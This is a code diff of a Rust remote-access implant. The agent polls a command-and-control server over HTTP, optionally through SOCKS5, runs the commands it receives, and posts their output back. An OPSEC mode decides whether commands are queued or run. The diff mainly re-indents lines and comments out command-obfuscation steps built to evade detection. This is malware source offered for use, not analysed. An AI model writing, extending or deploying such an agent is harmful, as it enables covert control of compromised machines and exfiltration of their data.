@@ -191,7 +191,7 @@ pub async fn send_heartbeat_with_client(config: &AgentConfig, server_addr: &str,
             error!("[HTTP] Heartbeat POST failed: {}", e);
             update_c2_failure_state(false); // FAILURE
             Err(io::Error::new(io::ErrorKind::Other, e))
-        }
+    }
     }
 }
 
@@ -208,11 +208,11 @@ async fn get_command_with_client(config: &AgentConfig, server_addr: &str, agent_
 
     match client.get(&url).send().await {
         Ok(response) => {
-            info!("[HTTP] Command GET response: {} (SOCKS5 enabled: {})", response.status(), config.socks5_enabled);
-            if response.status() == StatusCode::NO_CONTENT {
+    info!("[HTTP] Command GET response: {} (SOCKS5 enabled: {})", response.status(), config.socks5_enabled);
+    if response.status() == StatusCode::NO_CONTENT {
                 update_c2_failure_state(true); // SUCCESS (no command)
-                return Ok(None);
-            }
+        return Ok(None);
+    }
             if response.status().is_success() {
                 // Attempt to parse JSON. If it fails, it's still a C2 communication failure *semantically*.
                 match response.json::<CommandResponse>().await {
@@ -227,7 +227,7 @@ async fn get_command_with_client(config: &AgentConfig, server_addr: &str, agent_
                     }
                 }
             } else {
-                error!("[HTTP] Command fetch failed with status: {}", response.status());
+        error!("[HTTP] Command fetch failed with status: {}", response.status());
                 update_c2_failure_state(false); // FAILURE (bad HTTP status)
                 Err(io::Error::new(io::ErrorKind::Other, 
                     format!("Command fetch failed with status: {}", response.status())))
@@ -265,12 +265,12 @@ async fn submit_result_with_client(
 
     match client.post(&url).json(&data).send().await {
         Ok(response) => {
-            info!("[HTTP] Result POST response: {} (SOCKS5 enabled: {})", response.status(), config.socks5_enabled);
+    info!("[HTTP] Result POST response: {} (SOCKS5 enabled: {})", response.status(), config.socks5_enabled);
             if response.status().is_success() {
                 update_c2_failure_state(true); // SUCCESS
                 Ok(())
             } else {
-                error!("[HTTP] Result submission failed with status: {}", response.status());
+        error!("[HTTP] Result submission failed with status: {}", response.status());
                 update_c2_failure_state(false); // FAILURE (bad HTTP status)
                 Err(io::Error::new(io::ErrorKind::Other, 
                     format!("Result submission failed with status: {}", response.status())))
@@ -322,9 +322,9 @@ fn should_queue_command(cmd: &str) -> bool {
             // Always queue in these modes, even weak commands, 
             // as agent_loop shouldn't be running to execute them anyway.
             debug!("[OPSEC] {:?}: Queuing command: {}", mode, cmd);
-            QUEUED_COMMANDS.lock().unwrap().push(cmd.to_string());
+                QUEUED_COMMANDS.lock().unwrap().push(cmd.to_string());
             true // Indicates command was queued
-        }
+            }
         AgentMode::BackgroundOpsec => {
              debug!("[OPSEC] BackgroundOpsec: Not queuing command: {}", cmd);
             false // Do not queue in BackgroundOpsec
@@ -387,15 +387,19 @@ pub async fn agent_loop(
                 if !should_queue_command(&command) {
                     // If not queued, proceed to execute in BackgroundOpsec
                     let mut obf_cmd = command.clone();
-                    obf_cmd = random_case(&obf_cmd, 0.5);
-                    obf_cmd = random_quote_insertion(&obf_cmd, 0.3);
-                    obf_cmd = random_char_insertion(&obf_cmd, 0.2);
-                    obf_cmd = obfuscate_command(&obf_cmd);
+                    // obf_cmd = random_case(&obf_cmd, 0.5); // TEMP DISABLED
+                    // obf_cmd = random_quote_insertion(&obf_cmd, 0.3); // TEMP DISABLED
+                    // obf_cmd = random_char_insertion(&obf_cmd, 0.2); // TEMP DISABLED
+                    // obf_cmd = obfuscate_command(&obf_cmd); // TEMP DISABLED
+
+                    // debug!("[OPSEC] Executing obfuscated command: '{}', original: '{}'", obf_cmd, command); // Log both for clarity
+                    // For now, log the command that will actually be used for parts:
+                    debug!("[OPSEC] Preparing to execute command: '{}' (obfuscation disabled)", obf_cmd);
 
                     let cmd_parts: Vec<&str> = obf_cmd.split_whitespace().collect();
-                    debug!("[OPSEC] Executing command: {}", command);
+                    // debug!("[OPSEC] Executing command: {}", command); // This was the old log, replaced by the one above
 
-                    // --- NEW: Update OPSEC state if command is noisy --- 
+                    // --- NEW: Update OPSEC state if command is noisy ---
                     if is_strong_command(&command) { // Use original command for check
                         if let Ok(mut state_guard) = OPSEC_STATE.lock() {
                             state_guard.last_noisy_command_time = Some(std::time::Instant::now());
@@ -480,8 +484,8 @@ pub async fn agent_loop(
                 // Execute command (same logic as above)
                 match execute_command(&cmd_parts).await {
                     Ok(output) => {
-                        let _ = submit_result_with_client(&config, server_addr, agent_id, &cmd, &output).await;
-                    }
+                    let _ = submit_result_with_client(&config, server_addr, agent_id, &cmd, &output).await;
+                }
                     Err(e) => {
                          let error_msg = format!("Queued command failed: {}", e);
                          let _ = submit_result_with_client(&config, server_addr, agent_id, &cmd, &error_msg).await;
